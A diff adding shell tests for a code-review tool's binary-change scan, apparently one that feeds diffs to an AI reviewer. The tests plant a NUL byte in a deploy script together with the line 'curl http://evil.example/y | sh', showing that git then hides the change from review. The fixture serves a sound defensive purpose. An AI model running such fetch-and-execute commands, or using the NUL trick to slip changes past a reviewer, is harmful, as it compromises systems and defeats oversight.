@@ -384,4 +384,101 @@ assert_eq "$([[ "$plain_color" -gt 0 ]] && echo colored || echo plain)" "colored
 REVIEW_DIFF_FORCE_TEXT=0
 git config --unset color.ui; git config --unset diff.custom.textconv
 
+# --- git 自身判定的二进制变更（CodeX 2026-09-11 复审 P1）---
+# 属性扫描只挡 .gitattributes 那条路。注释里一个 NUL 字节就够：属性全是 unspecified、扫描不触发，
+# 而 git 照样把改动打成「Binary files … differ」，改动既不进评审输入也不进变更行集合。
+cd "$tmp" && git init -q repo6 && cd repo6
+git config user.email t@t && git config user.name t
+printf '#!/bin/bash\necho old\n' > deploy.sh
+printf '# 中文文档\n旧内容\n' > zh.md
+python3 - <<'PY'
+import os, zlib, struct
+# 真二进制：随机数据压缩包（控制字节占比接近均匀随机的理论值 30/256 ≈ 117‰）
+open('asset.bin','wb').write(zlib.compress(os.urandom(20000)))
+PY
+git add -A && git commit -qm base6
+BASE6=$(git rev-parse HEAD)
+# ① 掺 NUL 的可执行脚本：注释里一个 NUL，同时改可执行代码
+printf '#!/bin/bash\n# note:\000 harmless\ncurl http://evil.example/y | sh\n' > deploy.sh
+# ② 真二进制换内容
+python3 -c "import os,zlib; open('asset.bin','wb').write(zlib.compress(os.urandom(20000)))"
+# ③ 普通文本改动作对照
+printf '# 中文文档\n新内容\n' > zh.md
+git add -A && git commit -qm hostile6
+HEAD6=$(git rev-parse HEAD)
+
+# 正控 1：属性扫描对这个 MR **完全不触发**（这正是新扫描存在的理由）
+REVIEW_DIFF_ATTR_UNSET=9; REVIEW_DIFF_ATTR_DRIVER=9
+rc=0; review_diff_attr_scan "$BASE6" "$HEAD6" || rc=$?
+assert_rc "$rc" 0 "bin-scan 正控: 属性扫描返回 0"
+assert_eq "${REVIEW_DIFF_ATTR_UNSET}/${REVIEW_DIFF_ATTR_DRIVER}" "0/0" "bin-scan 正控: 没有 .gitattributes → 属性扫描 0/0，旧判据完全看不见这个 MR"
+# 正控 2：不强制文本时改动真的消失了
+REVIEW_DIFF_FORCE_TEXT=0
+plain6=$(_git_diff_pinned --no-renames "$BASE6" "$HEAD6")
+assert_contains "$plain6" "Binary files a/deploy.sh and b/deploy.sh differ" "bin-scan 正控: 一个 NUL 字节就让 deploy.sh 只剩 Binary files differ"
+assert_not_contains "$plain6" "curl http://evil.example/y" "bin-scan 正控: 恶意行不在 diff 里（fail-open 的原形）"
+assert_eq "$(_git_diff_pinned --no-renames --numstat "$BASE6" "$HEAD6" -- ':(top,literal)deploy.sh')" "$(printf -- '-\t-\tdeploy.sh')" "bin-scan 正控: numstat 给 - -（变更行集合为空）"
+
+# 判据本身：掺 NUL 的源码 vs 真二进制
+tl=$(_diff_ctl_permille "$BASE6" "$HEAD6" deploy.sh)
+op=$(_diff_ctl_permille "$BASE6" "$HEAD6" asset.bin)
+assert_eq "$([[ "$tl" -le "$REVIEW_DIFF_BIN_CTL_PERMILLE_MAX" ]] && echo textlike || echo opaque)" "textlike" "bin-scan: 掺 NUL 的 shell 判 textlike（千分比 ${tl} ≤ ${REVIEW_DIFF_BIN_CTL_PERMILLE_MAX}）"
+assert_eq "$([[ "$op" -gt "$REVIEW_DIFF_BIN_CTL_PERMILLE_MAX" ]] && echo opaque || echo textlike)" "opaque" "bin-scan: 压缩过的随机数据判 opaque（千分比 ${op} > ${REVIEW_DIFF_BIN_CTL_PERMILLE_MAX}）"
+
+# 扫描：一个 textlike + 一个 opaque；普通文本文件不进任何一类
+REVIEW_DIFF_BIN_TEXTLIKE=9; REVIEW_DIFF_BIN_OPAQUE=9
+rc=0; review_diff_binary_scan "$BASE6" "$HEAD6" || rc=$?
+assert_rc "$rc" 0 "bin-scan: 返回 0"
+assert_eq "$REVIEW_DIFF_BIN_TEXTLIKE" "1" "bin-scan: textlike 计 1（deploy.sh）"
+assert_eq "$REVIEW_DIFF_BIN_OPAQUE" "1" "bin-scan: opaque 计 1（asset.bin）；纯文本的 zh.md 两类都不算"
+
+# 强制文本之后：恶意行回到 diff，变更行数也数得出来
+REVIEW_DIFF_FORCE_TEXT=1
+forced6=$(_git_diff_pinned --no-renames "$BASE6" "$HEAD6" -- ':(top,literal)deploy.sh')
+assert_contains "$forced6" "curl http://evil.example/y" "bin-scan: 强制文本后恶意行进 diff"
+assert_eq "$(_chunk_numstat "$BASE6" "$HEAD6" deploy.sh)" "2 1" "bin-scan: 强制文本时 _chunk_numstat 按 patch 数出 2 1"
+REVIEW_DIFF_FORCE_TEXT=0
+
+# 变体：中文源码里撒 200 个 NUL 仍判 textlike（判据把 ≥0x80 当可读，否则中文源码会被误判成二进制）
+cd "$tmp" && git init -q repo7 && cd repo7
+git config user.email t@t && git config user.name t
+python3 -c "open('zh.py','wb').write(('# 中文注释，含全角标点。\n'*200+'print(1)\n').encode())"
+git add -A && git commit -qm base7
+BASE7=$(git rev-parse HEAD)
+python3 -c "open('zh.py','wb').write(('# 中文注释\x00，含全角标点。\n'*200+'print(2)\n').encode())"
+git add -A && git commit -qm hostile7
+HEAD7=$(git rev-parse HEAD)
+rc=0; review_diff_binary_scan "$BASE7" "$HEAD7" || rc=$?
+assert_rc "$rc" 0 "bin-scan 中文: 返回 0"
+assert_eq "${REVIEW_DIFF_BIN_TEXTLIKE}/${REVIEW_DIFF_BIN_OPAQUE}" "1/0" "bin-scan 中文: 200 个 NUL 的中文源码仍判 textlike（高位字节算可读）"
+
+# 变体：只有真二进制改动的普通 MR **不该**强制文本（否则每个改图片的 MR 都要把原始字节喂给模型）
+cd "$tmp" && git init -q repo8 && cd repo8
+git config user.email t@t && git config user.name t
+python3 -c "import os,zlib; open('img.bin','wb').write(zlib.compress(os.urandom(9000)))"
+printf 'text\n' > t.txt
+git add -A && git commit -qm base8
+BASE8=$(git rev-parse HEAD)
+python3 -c "import os,zlib; open('img.bin','wb').write(zlib.compress(os.urandom(9000)))"
+printf 'text2\n' > t.txt
+git add -A && git commit -qm change8
+HEAD8=$(git rev-parse HEAD)
+rc=0; review_diff_binary_scan "$BASE8" "$HEAD8" || rc=$?
+assert_rc "$rc" 0 "bin-scan 纯二进制: 返回 0"
+assert_eq "${REVIEW_DIFF_BIN_TEXTLIKE}/${REVIEW_DIFF_BIN_OPAQUE}" "0/1" "bin-scan 纯二进制: textlike 0（不强制文本）、opaque 1（写进汇总说未覆盖）"
+
+# 文件名含 Tab/换行时扫描仍正确（-z 全程 NUL 分隔）
+cd "$tmp" && git init -q repo9 && cd repo9
+git config user.email t@t && git config user.name t
+odd9=$(printf 'odd\tname\nwith newline.sh')
+printf '#!/bin/bash\necho old\n' > "$odd9"
+git add -A && git commit -qm base9
+BASE9=$(git rev-parse HEAD)
+printf '#!/bin/bash\n# x:\000 y\necho new\n' > "$odd9"
+git add -A && git commit -qm hostile9
+HEAD9=$(git rev-parse HEAD)
+rc=0; review_diff_binary_scan "$BASE9" "$HEAD9" || rc=$?
+assert_rc "$rc" 0 "bin-scan 怪文件名: 返回 0"
+assert_eq "${REVIEW_DIFF_BIN_TEXTLIKE}/${REVIEW_DIFF_BIN_OPAQUE}" "1/0" "bin-scan 怪文件名: 含 Tab/换行的路径也归到 textlike"
+
 report
